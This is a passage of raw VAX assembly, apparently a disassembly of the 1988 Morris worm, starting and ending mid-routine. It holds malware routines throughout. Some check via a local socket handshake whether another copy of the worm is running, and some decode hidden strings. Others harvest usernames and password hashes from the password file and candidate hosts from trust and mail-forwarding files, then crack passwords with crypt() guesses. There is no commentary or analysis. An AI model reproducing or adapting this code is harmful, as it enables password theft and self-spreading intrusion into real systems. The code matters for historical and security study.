	movl	r0,-0x50(fp)
	tstl	-0x50(fp)
	beql	LL5
	incl	-0x50(fp)
	brb	LL6
LL5:
	movl	0x4(ap),-0x50(fp)
LL6:
	pushl	-0x50(fp)
	pushl	-0x50(fp)
	calls	$0x1,_strlen	#  global routine _strlen#
	incl	r0
	pushl	r0
	calls	$0x1,_malloc	#  global routine _malloc#
	pushl	r0
	calls	$0x2,_strcpy	#  global routine _strcpy#
	mull3	$0xC,_nobjects,r1	#  global sym _nobjects#
	movl	r0,_objects	#  global sym _objects#
	mull3	$0xC,_nobjects,r0	#  global sym _nobjects#
	movl	-0x8(fp),_objects+0x4	#  global bss segment#
	mull3	$0xC,_nobjects,r0	#  global sym _nobjects#
	movl	-0x4C(fp),_objects+0x8	#  global bss segment#
	incl	_nobjects	#  global sym _nobjects#
	movl	$0x1,r0
	ret
	ret
LL0:
	movab	-0x50(sp),sp
	brw	LL7
####  END PROC ####

#### start of global routine "_getobjectbyname"	####
	.data
	.text
	.align	1
	.globl	 _getobjectbyname
_getobjectbyname:
	.word	S51
	.set	S51,0x0
	brb	LL0
LL4:
	clrf	-0x4(fp)
LL3:
	cmpl	-0x4(fp),_nobjects	#  global sym _nobjects#
	bgeq	LL1
	mull3	$0xC,-0x4(fp),r0
	pushl	_objects	#  global sym _objects#
	pushl	0x4(ap)
	calls	$0x2,_strcmp	#  global routine _strcmp#
	tstl	r0
	bneq	LL2
	mull3	$0xC,-0x4(fp),r0
	addl2	$_objects,r0	#  global sym _objects#
	ret
LL2:
	incl	-0x4(fp)
	brb	LL3
LL1:
	clrf	r0
	ret
	ret
LL0:
	subl2	$0x4,sp
	brb	LL4
	halt
####  END PROC ####

#### start of global routine "_xorbuf" ####
	.data
	.text
	.align	1
	.globl	 _xorbuf
_xorbuf:
	.word	S53
	.set	S53,0x0
	brb	LL0
LL3:
	movaf	_xorbuf,-0x4(fp)	#  global sym _xorbuf#
	clrf	-0x8(fp)
LL2:
	movl	0x8(ap),r0
	decl	0x8(ap)
	tstl	r0
	bleq	LL1
	movl	-0x4(fp),r0
	movl	-0x8(fp),r1
	xorb2	(r0)[r1],*0x4(ap)
	incl	0x4(ap)
	addl3	$0x1,-0x8(fp),r0
	divl3	$0xA,r0,r1
	mull2	$0xA,r1
	subl3	r1,r0,r1
	movl	r1,-0x8(fp)
	brb	LL2
LL1:
	ret
LL0:
	subl2	$0x8,sp
	brb	LL3
####  END PROC ####

#### start of global routine "_checkother" ####
	.data
	.text
	.align	1
	.globl	 _checkother
_checkother:
	.word	S55
	.set	S55,0x0
	brw	LL0
LL13:
	movl	$0x1,-0x14(fp)
	calls	$0x0,_random	#  global routine _random#
	divl3	$0x7,r0,r1
	mull2	$0x7,r1
	subl3	r1,r0,r1
	cmpl	r1,$0x3
	bneq	LL1
	ret
LL1:
	pushl	$0x0
	pushl	$0x1
	pushl	$0x2
	calls	$0x3,_socket	#  global routine _socket#
	movl	r0,-0x4(fp)
	tstl	-0x4(fp)
	bgeq	LL2
	ret
LL2:
	pushl	$0x10
	subl3	$0x24,fp,r0
	pushl	r0
	calls	$0x2,_bzero	#  global routine _bzero#
	cvtlw	$0x2,-0x24(fp)
	pushl	$_other_fd+0x4	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	calls	$0x1,_inet_addr	#  global routine _inet_addr#
	movl	r0,-0x20(fp)
	pushl	$0x5B3D
	calls	$0x1,_htons	#  global routine _htons#
	cvtlw	r0,-0x22(fp)
	pushl	$0x10
	subl3	$0x24,fp,r0
	pushl	r0
	pushl	-0x4(fp)
	calls	$0x3,_connect	#  global routine _connect#
	tstl	r0
	bgeq	LL3
	pushl	-0x4(fp)
	calls	$0x1,_close	#  global routine _close#
	brw	LL4
LL3:
	movl	$0x874697,-0x8(fp)
	pushl	$0x4
	subl3	$0x8,fp,r0
	pushl	r0
	pushl	-0x4(fp)
	calls	$0x3,_write	#  global routine _write#
	cmpl	r0,$0x4
	beql	LL5
	pushl	-0x4(fp)
	calls	$0x1,_close	#  global routine _close#
	ret
LL5:
	clrf	-0x8(fp)
	pushl	$0x12C
	pushl	$0x4
	subl3	$0x8,fp,r0
	pushl	r0
	pushl	-0x4(fp)
	calls	$0x4,_xread	#  global routine _xread#
	cmpl	r0,$0x4
	beql	LL6
	pushl	-0x4(fp)
	calls	$0x1,_close	#  global routine _close#
	ret
LL6:
	cmpl	-0x8(fp),$0x148898
	beql	LL7
	pushl	-0x4(fp)
	calls	$0x1,_close	#  global routine _close#
	ret
LL7:
	calls	$0x0,_random	#  global routine _random#
	ashl	$-0x3,r0,r0
	movl	r0,-0xC(fp)
	pushl	$0x4
	subl3	$0xC,fp,r0
	pushl	r0
	pushl	-0x4(fp)
	calls	$0x3,_write	#  global routine _write#
	cmpl	r0,$0x4
	beql	LL8
	pushl	-0x4(fp)
	calls	$0x1,_close	#  global routine _close#
	ret
LL8:
	pushl	$0xA
	pushl	$0x4
	subl3	$0x10,fp,r0
	pushl	r0
	pushl	-0x4(fp)
	calls	$0x4,_xread	#  global routine _xread#
	cmpl	r0,$0x4
	beql	LL9
	pushl	-0x4(fp)
	calls	$0x1,_close	#  global routine _close#
	ret
LL9:
	addl3	-0x10(fp),-0xC(fp),r0
	divl3	$0x2,r0,r1
	mull2	$0x2,r1
	subl3	r1,r0,r1
	tstl	r1
	bneq	LL10
	incl	_pleasequit	#  global sym _pleasequit#
LL10:
	pushl	-0x4(fp)
	calls	$0x1,_close	#  global routine _close#
LL4:
	pushl	$0x5
	calls	$0x1,_sleep	#  global routine _sleep#
	pushl	$0x0
	pushl	$0x1
	pushl	$0x2
	calls	$0x3,_socket	#  global routine _socket#
	movl	r0,-0x4(fp)
	tstl	-0x4(fp)
	bgeq	LL11
	ret
LL11:
	pushl	$0x4
	subl3	$0x14,fp,r0
	pushl	r0
	pushl	$0x4
	pushl	$_h_errno+0x11BB	#  global bss segment#
	pushl	-0x4(fp)
	calls	$0x5,_setsockopt	#  global routine _setsockopt#
	pushl	$0x10
	subl3	$0x24,fp,r0
	pushl	r0
	pushl	-0x4(fp)
	calls	$0x3,_bind	#  global routine _bind#
	tstl	r0
	bgeq	LL12
	pushl	-0x4(fp)
	calls	$0x1,_close	#  global routine _close#
	ret
LL12:
	pushl	$0xA
	pushl	-0x4(fp)
	calls	$0x2,_listen	#  global routine _listen#
	movl	-0x4(fp),_other_fd	#  global sym _other_fd#
	ret
LL0:
	subl2	$0x24,sp
	brw	LL13
####  END PROC ####

#### start of global routine "_other_sleep" ####
	.data
	.text
	.align	1
	.globl	 _other_sleep
_other_sleep:
	.word	S57
	.set	S57,0x0
	brw	LL0
LL10:
	tstl	_other_fd	#  global sym _other_fd#
	bgeq	LL1
	tstl	0x4(ap)
	beql	LL2
	pushl	0x4(ap)
	calls	$0x1,_sleep	#  global routine _sleep#
LL2:
	ret
LL1:
	tstl	_other_fd	#  global sym _other_fd#
	bgeq	LL3
	ret
LL3:
	ashl	_other_fd,$0x1,r0	#  global sym _other_fd#
	movl	r0,-0x8(fp)
	tstl	0x4(ap)
	bgeq	LL4
	clrf	0x4(ap)
LL4:
	movl	0x4(ap),-0x18(fp)
	clrf	-0x14(fp)
	tstl	0x4(ap)
	beql	LL5
	subl3	$0xC,fp,r0
	pushl	r0
	calls	$0x1,_time	#  global routine _time#
LL5:
	subl3	$0x18,fp,r0
	pushl	r0
	pushl	$0x0
	pushl	$0x0
	subl3	$0x8,fp,r0
	pushl	r0
	addl3	$0x1,_other_fd,r0	#  global sym _other_fd#
	pushl	r0
	calls	$0x5,_select	#  global routine _select#
	movl	r0,-0x4(fp)
	tstl	-0x4(fp)
	bgeq	LL6
	pushl	$0x1
	calls	$0x1,_sleep	#  global routine _sleep#
LL6:
	tstl	-0x8(fp)
	beql	LL7
	calls	$0x0,0x34BE
LL7:
	tstl	0x4(ap)
	beql	LL8
	subl3	$0x10,fp,r0
	pushl	r0
	calls	$0x1,_time	#  global routine _time#
	subl3	-0xC(fp),-0x10(fp),r0
	subl2	r0,0x4(ap)
LL8:
	tstl	0x4(ap)
	bleq	LL9
	brw	LL1
LL9:
	ret
LL0:
	subl2	$0x18,sp
	brw	LL10
	halt
	halt
	brw	LL11
LL20:
	movl	$0x10,-0x8(fp)
	subl3	$0x8,fp,r0
	pushl	r0
	subl3	$0x24,fp,r0
	pushl	r0
	pushl	_other_fd	#  global sym _other_fd#
	calls	$0x3,_accept	#  global routine _accept#
	movl	r0,-0x4(fp)
	tstl	-0x4(fp)
	bgeq	LL12
	ret
LL12:
	movl	$0x148898,-0xC(fp)
	pushl	$0x4
	subl3	$0xC,fp,r0
	pushl	r0
	pushl	-0x4(fp)
	calls	$0x3,_write	#  global routine _write#
	cmpl	r0,$0x4
	beql	LL13
	pushl	-0x4(fp)
	calls	$0x1,_close	#  global routine _close#
	ret
LL13:
	pushl	$0xA
	pushl	$0x4
	subl3	$0xC,fp,r0
	pushl	r0
	pushl	-0x4(fp)
	calls	$0x4,_xread	#  global routine _xread#
	cmpl	r0,$0x4
	beql	LL14
	pushl	-0x4(fp)
	calls	$0x1,_close	#  global routine _close#
	ret
LL14:
	cmpl	-0xC(fp),$0x874697
	beql	LL15
	pushl	-0x4(fp)
	calls	$0x1,_close	#  global routine _close#
	ret
LL15:
	calls	$0x0,_random	#  global routine _random#
	ashl	$-0x3,r0,r0
	movl	r0,-0x10(fp)
	pushl	$0x4
	subl3	$0x10,fp,r0
	pushl	r0
	pushl	-0x4(fp)
	calls	$0x3,_write	#  global routine _write#
	cmpl	r0,$0x4
	beql	LL16
	pushl	-0x4(fp)
	calls	$0x1,_close	#  global routine _close#
	ret
LL16:
	pushl	$0xA
	pushl	$0x4
	subl3	$0x14,fp,r0
	pushl	r0
	pushl	-0x4(fp)
	calls	$0x4,_xread	#  global routine _xread#
	cmpl	r0,$0x4
	beql	LL17
	pushl	-0x4(fp)
	calls	$0x1,_close	#  global routine _close#
	ret
LL17:
	pushl	-0x4(fp)
	calls	$0x1,_close	#  global routine _close#
	pushl	$_other_fd+0xE	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	calls	$0x1,_inet_addr	#  global routine _inet_addr#
	movl	r0,-0x28(fp)
	cmpl	-0x20(fp),-0x28(fp)
	beql	LL18
	ret
LL18:
	addl3	-0x14(fp),-0x10(fp),r0
	divl3	$0x2,r0,r1
	mull2	$0x2,r1
	subl3	r1,r0,r1
	tstl	r1
	beql	LL19
	pushl	_other_fd	#  global sym _other_fd#
	calls	$0x1,_close	#  global routine _close#
	mnegl	$0x1,_other_fd	#  global sym _other_fd#
	incl	_pleasequit	#  global sym _pleasequit#
LL19:
	ret
	ret
LL11:
	subl2	$0x28,sp
	brw	LL20
####  END PROC ####

#### start of global routine "_xread" ####
	.data
	.text
	.align	1
	.globl	 _xread
_xread:
	.word	S59
	.set	S59,0x0
	brb	LL0
LL6:
	clrf	-0x4(fp)
LL5:
	cmpl	-0x4(fp),0xC(ap)
	bgeq	LL1
	ashl	0x4(ap),$0x1,r0
	movl	r0,-0xC(fp)
	movl	0x10(ap),-0x14(fp)
	clrf	-0x10(fp)
	subl3	$0x14,fp,r0
	pushl	r0
	pushl	$0x0
	pushl	$0x0
	subl3	$0xC,fp,r0
	pushl	r0
	addl3	$0x1,0x4(ap),r0
	pushl	r0
	calls	$0x5,_select	#  global routine _select#
	tstl	r0
	bgtr	LL2
	clrf	r0
	ret
LL2:
	tstl	-0xC(fp)
	bneq	LL3
	clrf	r0
	ret
LL3:
	pushl	$0x1
	addl3	-0x4(fp),0x8(ap),r0
	pushl	r0
	pushl	0x4(ap)
	calls	$0x3,_read	#  global routine _read#
	cmpl	r0,$0x1
	beql	LL4
	clrf	r0
	ret
LL4:
	incl	-0x4(fp)
	brb	LL5
LL1:
	movl	-0x4(fp),r0
	ret
	ret
LL0:
	subl2	$0x14,sp
	brb	LL6
	halt
	halt
####  END PROC ####

#### start of global routine "_cracksome" ####
	.data
	.text
	.align	1
	.globl	 _cracksome
_cracksome:
	.word	S61
	.set	S61,0x0
	brb	LL0
LL5:
	tstl	_cmode	#  global sym _cmode#
	bneq	LL1
	calls	$0x0,0x36CC
	brb	LL2
LL1:
	cmpl	_cmode,$0x1	#  global sym _cmode#
	bneq	LL3
	calls	$0x0,0x3AF0
	brb	LL2
LL3:
	cmpl	_cmode,$0x2	#  global sym _cmode#
	bneq	LL4
	calls	$0x0,0x3FE8
	brb	LL2
LL4:
	cmpl	_cmode,$0x3	#  global sym _cmode#
	bneq	LL2
	calls	$0x0,0x40F4
LL2:
	ret
LL0:
	brb	LL5
	halt
	halt
	brw	LL6
LL33:
	pushl	$_other_fd+0x29	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	pushl	$_other_fd+0x18	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	calls	$0x2,_fopen	#  global routine _fopen#
	movl	r0,-0x4(fp)
	tstl	-0x4(fp)
	bneq	LL7
	brw	LL8
LL7:
	subl3	$0x204,fp,r0
	pushl	r0
	pushl	$_other_fd+0x2B	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	pushl	-0x4(fp)
	calls	$0x3,_fscanf	#  global routine _fscanf#
	tstl	r0
	beql	LL9
	pushl	$0x0
	subl3	$0x204,fp,r0
	pushl	r0
	calls	$0x2,_h_name2host	#  global routine _h_name2host#
	movl	r0,-0x418(fp)
	tstl	-0x418(fp)
	bneq	LL10
	pushl	$0x1
	subl3	$0x204,fp,r0
	pushl	r0
	calls	$0x2,_h_name2host	#  global routine _h_name2host#
	movl	r0,-0x418(fp)
	pushl	-0x418(fp)
	calls	$0x1,_getaddrs	#  global routine _getaddrs#
LL10:
	movl	-0x418(fp),r0
	tstl	0x30(r0)
	bneq	LL11
	brb	LL7
LL11:
	movl	-0x418(fp),r0
	bisl2	$0x8,0x48(r0)
	brb	LL7
LL9:
	pushl	-0x4(fp)
	calls	$0x1,_fclose	#  global routine _fclose#
LL8:
	pushl	$_other_fd+0x3B	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	pushl	$_other_fd+0x32	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	calls	$0x2,_fopen	#  global routine _fopen#
	movl	r0,-0x4(fp)
	tstl	-0x4(fp)
	bneq	LL12
	brw	LL13
LL12:
	pushl	-0x4(fp)
	pushl	$0x100
	subl3	$0x408,fp,r0
	pushl	r0
	calls	$0x3,_fgets	#  global routine _fgets#
	tstl	r0
	bneq	LL14
	brw	LL15
LL14:
	subl3	$0x204,fp,r0
	pushl	r0
	pushl	$_other_fd+0x3D	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	subl3	$0x408,fp,r0
	pushl	r0
	calls	$0x3,_sscanf	#  global routine _sscanf#
	cmpl	r0,$0x1
	beql	LL16
	brb	LL12
LL16:
	pushl	$0x0
	subl3	$0x204,fp,r0
	pushl	r0
	calls	$0x2,_h_name2host	#  global routine _h_name2host#
	movl	r0,-0x418(fp)
	tstl	-0x418(fp)
	bneq	LL17
	pushl	$0x1
	subl3	$0x204,fp,r0
	pushl	r0
	calls	$0x2,_h_name2host	#  global routine _h_name2host#
	movl	r0,-0x418(fp)
	pushl	-0x418(fp)
	calls	$0x1,_getaddrs	#  global routine _getaddrs#
LL17:
	movl	-0x418(fp),r0
	tstl	0x30(r0)
	bneq	LL18
	brw	LL12
LL18:
	movl	-0x418(fp),r0
	bisl2	$0x8,0x48(r0)
	brw	LL12
LL15:
	pushl	-0x4(fp)
	calls	$0x1,_fclose	#  global routine _fclose#
LL13:
	calls	$0x0,_setpwent	#  global routine _setpwent#
	clrf	-0x41C(fp)
LL30:
	calls	$0x0,_getpwent	#  global routine _getpwent#
	movl	r0,-0x40C(fp)
	bneq	LL19
	brw	LL20
LL19:
	divl3	$0xA,-0x41C(fp),r0
	mull2	$0xA,r0
	subl3	r0,-0x41C(fp),r0
	tstl	r0
	bneq	LL21
	pushl	$0x0
	calls	$0x1,_other_sleep	#  global routine _other_sleep#
LL21:
	incl	-0x41C(fp)
	movl	-0x40C(fp),r0
	pushl	0x1C(r0)
	pushl	$_other_fd+0x40	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	subl3	$0x304,fp,r0
	pushl	r0
	calls	$0x3,_sprintf	#  global routine _sprintf#
	pushl	$_other_fd+0x50	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	subl3	$0x304,fp,r0
	pushl	r0
	calls	$0x2,_fopen	#  global routine _fopen#
	movl	r0,-0x4(fp)
	tstl	-0x4(fp)
	bneq	LL22
	brw	LL23
LL22:
	pushl	-0x4(fp)
	pushl	$0x200
	subl3	$0x204,fp,r0
	pushl	r0
	calls	$0x3,_fgets	#  global routine _fgets#
	tstl	r0
	bneq	LL24
	brw	LL25
LL24:
	subl3	$0x204,fp,r0
	pushl	r0
	calls	$0x1,_strlen	#  global routine _strlen#
	decl	r0
	subl3	$0x204,fp,r1
	addl2	r1,r0
	movl	r0,-0x420(fp)
	clrb	*-0x420(fp)
	pushl	$0x40
	subl3	$0x204,fp,r0
	pushl	r0
	calls	$0x2,_index	#  global routine _index#
	movl	r0,-0x308(fp)
	tstl	-0x308(fp)
	bneq	LL26
	brb	LL22
LL26:
	incl	-0x308(fp)
	pushl	$0x0
	pushl	-0x308(fp)
	calls	$0x2,_h_name2host	#  global routine _h_name2host#
	movl	r0,-0x418(fp)
	tstl	-0x418(fp)
	bneq	LL27
	pushl	$0x1
	pushl	-0x308(fp)
	calls	$0x2,_h_name2host	#  global routine _h_name2host#
	movl	r0,-0x418(fp)
	pushl	-0x418(fp)
	calls	$0x1,_getaddrs	#  global routine _getaddrs#
LL27:
	movl	-0x418(fp),r0
	tstl	0x30(r0)
	bneq	LL28
	brw	LL22
LL28:
	movl	-0x418(fp),r0
	bisl2	$0x8,0x48(r0)
	brw	LL22
LL25:
	pushl	-0x4(fp)
	calls	$0x1,_fclose	#  global routine _fclose#
LL23:
	pushl	*-0x40C(fp)
	calls	$0x1,_strlen	#  global routine _strlen#
	cmpl	r0,$0xB
	bleq	LL29
	brw	LL30
LL29:
	pushl	$0x3C
	calls	$0x1,_malloc	#  global routine _malloc#
	movl	r0,-0x410(fp)
	pushl	*-0x40C(fp)
	pushl	-0x410(fp)
	calls	$0x2,_strcpy	#  global routine _strcpy#
	movl	-0x40C(fp),r0
	pushl	0x4(r0)
	calls	$0x1,_strlen	#  global routine _strlen#
	cmpl	r0,$0xD
	bneq	LL31
	movl	-0x40C(fp),r0
	pushl	0x4(r0)
	addl3	$0x10,-0x410(fp),r0
	pushl	r0
	calls	$0x2,_strcpy	#  global routine _strcpy#
	brb	LL32
LL31:
	pushl	$_other_fd+0x52	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	addl3	$0x10,-0x410(fp),r0
	pushl	r0
	calls	$0x2,_strcpy	#  global routine _strcpy#
LL32:
	movl	-0x410(fp),r0
	clrb	0x1E(r0)
	movl	-0x40C(fp),r0
	pushl	0x1C(r0)
	movl	-0x40C(fp),r0
	pushl	0x1C(r0)
	calls	$0x1,_strlen	#  global routine _strlen#
	incl	r0
	pushl	r0
	calls	$0x1,_malloc	#  global routine _malloc#
	pushl	r0
	calls	$0x2,_strcpy	#  global routine _strcpy#
	movl	-0x410(fp),r1
	movl	r0,0x30(r1)
	movl	-0x40C(fp),r0
	pushl	0x18(r0)
	movl	-0x40C(fp),r0
	pushl	0x18(r0)
	calls	$0x1,_strlen	#  global routine _strlen#
	incl	r0
	pushl	r0
	calls	$0x1,_malloc	#  global routine _malloc#
	pushl	r0
	calls	$0x2,_strcpy	#  global routine _strcpy#
	movl	-0x410(fp),r1
	movl	r0,0x34(r1)
	movl	-0x410(fp),r0
	movl	_h_errno+0x2810,0x38(r0)	#  global bss segment#
	movl	-0x410(fp),_h_errno+0x2810	#  global bss segment#
	brw	LL30
LL20:
	calls	$0x0,_endpwent	#  global routine _endpwent#
	movl	$0x1,_cmode	#  global sym _cmode#
	movl	_h_errno+0x2810,_h_errno+0x2814	#  global bss segment global bss segment#
	ret
LL6:
	movab	-0x420(sp),sp
	brw	LL33
	halt
	halt
	brw	LL34
LL50:
	clrf	-0x4(fp)
LL48:
	tstl	_h_errno+0x2814	#  global bss segment#
	bneq	LL35
LL37:
	brw	LL36
LL35:
	cmpl	-0x4(fp),$0x32
	bgeq	LL37
	divl3	$0xA,-0x4(fp),r0
	mull2	$0xA,r0
	subl3	r0,-0x4(fp),r0
	tstl	r0
	bneq	LL38
	pushl	$0x0
	calls	$0x1,_other_sleep	#  global routine _other_sleep#
LL38:
	pushl	$_other_fd+0x54	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	pushl	_h_errno+0x2814	#  global bss segment#
	calls	$0x2,0x3D88
	tstl	r0
	beql	LL39
	brw	LL40
LL39:
	addl3	$0x10,_h_errno+0x2814,r0	#  global bss segment#
	pushl	r0
	calls	$0x1,_strlen	#  global routine _strlen#
	cmpl	r0,$0xD
	beql	LL41
	brw	LL40
LL41:
	pushl	$0x31
	pushl	_h_errno+0x2814	#  global bss segment#
	subl3	$0x36,fp,r0
	pushl	r0
	calls	$0x3,_strncpy	#  global routine _strncpy#
	clrb	-0x5(fp)
	subl3	$0x36,fp,r0
	pushl	r0
	pushl	_h_errno+0x2814	#  global bss segment#
	calls	$0x2,0x3D88
	tstl	r0
	beql	LL42
	brw	LL40
LL42:
	subl3	$0x36,fp,r0
	pushl	r0
	subl3	$0x36,fp,r0
	pushl	r0
	pushl	$_other_fd+0x55	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	subl3	$0x68,fp,r0
	pushl	r0
	calls	$0x4,_sprintf	#  global routine _sprintf#
	subl3	$0x68,fp,r0
	pushl	r0
	pushl	_h_errno+0x2814	#  global bss segment#
	calls	$0x2,0x3D88
	tstl	r0
	beql	LL43
	brw	LL40
LL43:
	subl3	$0x68,fp,r0
	pushl	r0
	pushl	$_other_fd+0x60	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	movl	_h_errno+0x2814,r0	#  global bss segment#
	pushl	0x34(r0)
	calls	$0x3,_sscanf	#  global routine _sscanf#
	cvtbl	-0x68(fp),r0
	bitb	$0x1,__ctype_+0x1[r0]	#  global data segment#
	beql	LL44
	cvtbl	-0x68(fp),r0
	addl2	$0x20,r0
	cvtlb	r0,-0x68(fp)
LL44:
	subl3	$0x68,fp,r0
	pushl	r0
	calls	$0x1,_strlen	#  global routine _strlen#
	cmpl	r0,$0x3
	bleq	LL45
	subl3	$0x68,fp,r0
	pushl	r0
	pushl	_h_errno+0x2814	#  global bss segment#
	calls	$0x2,0x3D88
	tstl	r0
	beql	LL45
	brw	LL40
LL45:
	clrb	-0x68(fp)
	subl3	$0x68,fp,r0
	pushl	r0
	pushl	$_other_fd+0x67	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	movl	_h_errno+0x2814,r0	#  global bss segment#
	pushl	0x34(r0)
	calls	$0x3,_sscanf	#  global routine _sscanf#
	cvtbl	-0x68(fp),r0
	bitb	$0x1,__ctype_+0x1[r0]	#  global data segment#
	beql	LL46
	cvtbl	-0x68(fp),r0
	addl2	$0x20,r0
	cvtlb	r0,-0x68(fp)
LL46:
	subl3	$0x68,fp,r0
	pushl	r0
	calls	$0x1,_strlen	#  global routine _strlen#
	cmpl	r0,$0x3
	bleq	LL47
	pushl	$0x2C
	subl3	$0x68,fp,r0
	pushl	r0
	calls	$0x2,_index	#  global routine _index#
	tstl	r0
	bneq	LL47
	subl3	$0x68,fp,r0
	pushl	r0
	pushl	_h_errno+0x2814	#  global bss segment#
	calls	$0x2,0x3D88
	tstl	r0
	beql	LL47
	brb	LL40
LL47:
	subl3	$0x68,fp,r0
	pushl	r0
	subl3	$0x36,fp,r0
	pushl	r0
	calls	$0x2,0x3D40
	subl3	$0x68,fp,r0
	pushl	r0
	pushl	_h_errno+0x2814	#  global bss segment#
	calls	$0x2,0x3D88
	tstl	r0
	beql	LL40
	brb	LL40
LL40:
	movl	_h_errno+0x2814,r0	#  global bss segment#
	movl	0x38(r0),_h_errno+0x2814	#  global bss segment#
	brw	LL48
LL36:
	tstl	_h_errno+0x2814	#  global bss segment#
	bneq	LL49
	movl	$0x2,_cmode	#  global sym _cmode#
LL49:
	ret
LL34:
	movab	-0x68(sp),sp
	brw	LL50
	halt
	halt
	halt
	brb	LL51
LL54:
	pushl	0x4(ap)
	calls	$0x1,_strlen	#  global routine _strlen#
	movl	r0,-0x4(fp)
	clrf	-0x8(fp)
LL53:
	cmpl	-0x8(fp),-0x4(fp)
	bgeq	LL52
	subl3	-0x8(fp),-0x4(fp),r0
	decl	r0
	movl	0x8(ap),r1
	movl	-0x8(fp),r2
	movb	*0x4(ap)[r0],(r1)[r2]
	incl	-0x8(fp)
	brb	LL53
LL52:
	movl	0x8(ap),r0
	movl	-0x4(fp),r1
	clrb	(r0)[r1]
	ret
LL51:
	subl2	$0x8,sp
	brb	LL54
	halt
	halt
	brb	LL55
LL58:
	addl3	$0x10,0x4(ap),r0
	pushl	r0
	pushl	0x8(ap)
	calls	$0x2,_crypt	#  global routine _crypt#
	pushl	r0
	addl3	$0x10,0x4(ap),r0
	pushl	r0
	calls	$0x2,_strcmp	#  global routine _strcmp#
	tstl	r0
	beql	LL56
	tstb	*0x8(ap)
	bneq	LL57
	movl	0x4(ap),r0
	tstb	0x10(r0)
	bneq	LL57
LL56:
	pushl	$0xE
	pushl	0x8(ap)
	addl3	$0x1E,0x4(ap),r0
	pushl	r0
	calls	$0x3,_strncpy	#  global routine _strncpy#
	movl	0x4(ap),r0
	clrb	0x2C(r0)
	pushl	0x4(ap)
	calls	$0x1,0x3DEE
	movl	$0x1,r0
	ret
LL57:
	clrf	r0
	ret
	ret
LL55:
	brb	LL58
	halt
	halt
	halt
	brw	LL59
LL69:
	movl	0x4(ap),r0
	pushl	0x30(r0)
	pushl	$_other_fd+0x73	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	subl3	$0x204,fp,r0
	pushl	r0
	calls	$0x3,_sprintf	#  global routine _sprintf#
	pushl	$_other_fd+0x83	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	subl3	$0x204,fp,r0
	pushl	r0
	calls	$0x2,_fopen	#  global routine _fopen#
	movl	r0,-0x4(fp)
	tstl	-0x4(fp)
	bneq	LL60
	brw	LL61
LL60:
	pushl	-0x4(fp)
	pushl	$0x200
	subl3	$0x204,fp,r0
	pushl	r0
	calls	$0x3,_fgets	#  global routine _fgets#
	tstl	r0
	bneq	LL62
	brw	LL63
LL62:
	subl3	$0x204,fp,r0
	pushl	r0
	calls	$0x1,_strlen	#  global routine _strlen#
	decl	r0
	subl3	$0x204,fp,r1
	addl2	r1,r0
	movl	r0,-0x510(fp)
	clrb	*-0x510(fp)
	pushl	$0x40
	subl3	$0x204,fp,r0
	pushl	r0
	calls	$0x2,_index	#  global routine _index#
	movl	r0,-0x208(fp)
	tstl	-0x208(fp)
	bneq	LL64
	brb	LL60
LL64:
	clrb	*-0x208(fp)
	incl	-0x208(fp)
	subl3	$0x204,fp,r0
	pushl	r0
	pushl	$0x1
	pushl	-0x208(fp)
	calls	$0x3,_h_name2host	#  global routine _h_name2host#
	movl	r0,-0x50C(fp)
	pushl	-0x50C(fp)
	pushl	0x4(ap)
	calls	$0x2,_hu1	#  global routine _hu1#
	brw	LL60
LL63:
	pushl	-0x4(fp)
	calls	$0x1,_fclose	#  global routine _fclose#
LL61:
	movl	0x4(ap),r0
	pushl	0x30(r0)
	pushl	$_other_fd+0x85	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	subl3	$0x204,fp,r0
	pushl	r0
	calls	$0x3,_sprintf	#  global routine _sprintf#
	pushl	$_other_fd+0x94	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	subl3	$0x204,fp,r0
	pushl	r0
	calls	$0x2,_fopen	#  global routine _fopen#
	movl	r0,-0x4(fp)
	tstl	-0x4(fp)
	bneq	LL65
	brw	LL66
LL65:
	pushl	-0x4(fp)
	pushl	$0x100
	subl3	$0x308,fp,r0
	pushl	r0
	calls	$0x3,_fgets	#  global routine _fgets#
	tstl	r0
	beql	LL67
	clrb	-0x508(fp)
	subl3	$0x508,fp,r0
	pushl	r0
	subl3	$0x204,fp,r0
	pushl	r0
	pushl	$_other_fd+0x96	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	subl3	$0x308,fp,r0
	pushl	r0
	calls	$0x4,_sscanf	#  global routine _sscanf#
	cmpl	r0,$0x1
	bgeq	LL68
	brb	LL65
LL68:
	pushl	$0x1
	subl3	$0x204,fp,r0
	pushl	r0
	calls	$0x2,_h_name2host	#  global routine _h_name2host#
	movl	r0,-0x50C(fp)
	subl3	$0x508,fp,r0
	pushl	r0
	pushl	-0x50C(fp)
	pushl	0x4(ap)
	calls	$0x3,_hu1	#  global routine _hu1#
	brw	LL65
LL67:
	pushl	-0x4(fp)
	calls	$0x1,_fclose	#  global routine _fclose#
LL66:
	ret
LL59:
	movab	-0x510(sp),sp
	brw	LL69
	halt
	halt
	halt
	brw	LL70
LL81:
	movl	_nextw,r0	#  global sym _nextw#
	tstl	_wds[r0]	#  global sym _wds#
	bneq	LL71
	incl	_cmode	#  global sym _cmode#
	ret
LL71:
	tstl	_nextw	#  global sym _nextw#
	bneq	LL72
	clrf	-0x8(fp)
LL74:
	movl	-0x8(fp),r0
	tstl	_wds[r0]	#  global sym _wds#
